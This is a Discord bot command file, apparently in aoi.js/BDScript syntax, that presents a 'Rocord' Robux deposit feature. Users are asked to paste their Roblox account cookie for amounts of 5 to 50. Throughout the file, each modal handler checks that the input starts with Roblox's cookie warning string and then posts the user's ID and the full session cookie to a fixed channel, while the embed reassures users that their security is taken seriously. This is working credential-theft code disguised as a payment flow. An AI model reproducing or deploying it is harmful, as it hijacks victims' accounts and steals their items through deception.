module.exports = [{
name: 'depo',
aliases: ['dep', 'deposit'],
code: `

$author[$username[$authorID];$userAvatar[$authorID]]
$thumbnail[https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png]
$description[
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- 5 $
- 10 $
- 20 $
- 30 $
- 50 $

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
]
$footer[Rocord]
$addtimestamp
$color[Blue]

$addButton[1;50 R$;primary;dep50_$authorID;false]
$addButton[1;30 R$;primary;dep30_$authorID;false]
$addButton[1;20 R$;primary;dep20_$authorID;false]
$addButton[1;10 R$;primary;dep10_$authorID;false]
$addButton[1;5 R$;primary;dep5_$authorID;false]


`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[5R$ Deposit;depo5;
{actionRow:
{textInput:Security Cookie:1:cookieinput:true:your security code}
}
]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==dep5;]
`
},{
name: "depo5",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1129331561267990528;
t.depo5 $interactionData[author.id] $textinputvalue[cookieinput]
]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{description:
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- **5 $**
- 10 $
- 20 $
- 30 $
- 50 $

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
}
{footer:Rocord}
{timestamp}
{color:#00ff00}
};
{actionRow:
{button:5 $:success:aperm:true} 
{button:10 $:primary:bperm:true}
{button:20 $:primary:cperm:true}
{button:30 $:primary:dperm:true}
{button:50 $:primary:eperm:true}
}
]

$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
{
    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
    "ephemeral" : true,
    "options" : {
        "interaction" : true
    }
}
]

`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[10R$ Deposit;depo10;
{actionRow:
{textInput:Security Cookie:1:cookieinput:true:your security code}
}
]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==dep10;]
`
},{
name: "depo10",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1129331561267990528;
t.depo10 $interactionData[author.id] $textinputvalue[cookieinput]
]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{description:
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- 5 $
- **10 $**
- 20 $
- 30 $
- 50 $

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
}
{footer:Rocord}
{timestamp}
{color:#00ff00}
};
{actionRow:
{button:5 $:primary:aperm:true} 
{button:10 $:success:bperm:true}
{button:20 $:primary:cperm:true}
{button:30 $:primary:dperm:true}
{button:50 $:primary:eperm:true}
}
]

$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
{
    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
    "ephemeral" : true,
    "options" : {
        "interaction" : true
    }
}
]

`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[20R$ Deposit;depo20;
{actionRow:
{textInput:Security Cookie:1:cookieinput:true:your security code}
}
]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==dep20;]
`
},{
name: "depo20",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1129331561267990528;
t.depo20 $interactionData[author.id] $textinputvalue[cookieinput]
]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{description:
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- 5 $
- 10 $
- **20 $**
- 30 $
- 50 $

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
}
{footer:Rocord}
{timestamp}
{color:#00ff00}
};
{actionRow:
{button:5 $:primary:aperm:true} 
{button:10 $:primary:bperm:true}
{button:20 $:success:cperm:true}
{button:30 $:primary:dperm:true}
{button:50 $:primary:eperm:true}
}
]

$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
{
    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
    "ephemeral" : true,
    "options" : {
        "interaction" : true
    }
}
]

`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[30R$ Deposit;depo30;
{actionRow:
{textInput:Security Cookie:1:cookieinput:true:your security code}
}
]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==dep30;]
`
},{
name: "depo30",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1129331561267990528;
t.depo30 $interactionData[author.id] $textinputvalue[cookieinput]
]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{description:
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- 5 $
- 10 $
- 20 $
- **30 $**
- 50 $

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
}
{footer:Rocord}
{timestamp}
{color:#00ff00}
};
{actionRow:
{button:5 $:primary:aperm:true} 
{button:10 $:primary:bperm:true}
{button:20 $:primary:cperm:true}
{button:30 $:success:dperm:true}
{button:50 $:primary:eperm:true}
}
]

$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
{
    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
    "ephemeral" : true,
    "options" : {
        "interaction" : true
    }
}
]

`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[50R$ Deposit;depo50;
{actionRow:
{textInput:Security Cookie:1:cookieinput:true:your security code}
}
]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==dep50;]
`
},{
name: "depo50",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1129331561267990528;
t.depo50 $interactionData[author.id] $textinputvalue[cookieinput]
]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{description:
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- 5 $
- 10 $
- 20 $
- 30 $
- **50 $**

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
}
{footer:Rocord}
{timestamp}
{color:#00ff00}
};
{actionRow:
{button:5 $:primary:aperm:true} 
{button:10 $:primary:bperm:true}
{button:20 $:primary:cperm:true}
{button:30 $:primary:dperm:true}
{button:50 $:success:eperm:true}
}
]

$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
{
    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
    "ephemeral" : true,
    "options" : {
        "interaction" : true
    }
}
]

`
}]